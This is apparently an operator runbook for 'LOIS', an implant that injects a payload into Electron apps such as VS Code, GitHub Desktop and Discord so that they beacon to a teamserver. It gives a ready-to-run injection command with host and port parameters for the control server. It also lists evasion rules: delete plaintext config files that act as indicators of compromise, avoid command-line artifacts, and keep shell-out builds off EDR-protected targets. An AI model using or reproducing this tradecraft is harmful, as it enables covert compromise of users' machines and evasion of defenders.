# LOIS runbook

## Re-injection after app updates (ticket 007)

Host-app updates kill the hook silently:

| App | Updater | What happens on update |
|---|---|---|
| GitHub Desktop | Squirrel | whole `app-<version>` dir replaced; new dir is clean |
| VS Code | NSIS (user setup) | `resources\app\` rewritten in place; `out\main.js` is stock again |
| Discord | Squirrel | same as GHD (fused path — `app.asar.unpacked` hook target) |

**Detect:** the agent stops beating after an app update. On the teamserver,
the agent's last-tick ages out right when the host app updated (check the
app's install dir mtime / new version dir).

**Re-inject** (on the target, no node needed — use the app's own Electron):

```cmd
set ELECTRON_RUN_AS_NODE=1
"C:\path\to\Code.exe" C:\path\to\inject_unpacked.js ^
  --app "<install>\resources" --payload C:\path\to\support.js ^
  --name support --target app/out/main.js --host <H> --port <P>
```

- Re-running the injector on an already-hooked target is a safe no-op
  (marker-checked; suite-enforced). After a REAL update the hook is gone,
  so just inject fresh — no `--clean` needed.
- Delete the injector-written `support.json` sidecar when the payload has
  an encrypted bake (plaintext config = avoidable IoC).
- Verify: agent re-registers (new id — expected, `agent_id: auto`), run a
  `pwd`, reconcile the dead agent entries on the teamserver.
- Never install a resident "watcher" to auto-reinject — a watcher is its own
  persistence artifact. Human-in-loop is the design.

## Deploy rules (unchanged, repeated)

- Injection only — no `ELECTRON_RUN_AS_NODE` launcher on real targets
  (command-line artifact).
- Never add autostart artifacts (no new Run keys/schtasks); the beacon runs
  when the user runs the app. Autostart riding is descoped (ticket 006).
- No debug builds on target; no `--allow-shellout` builds on EDR targets.
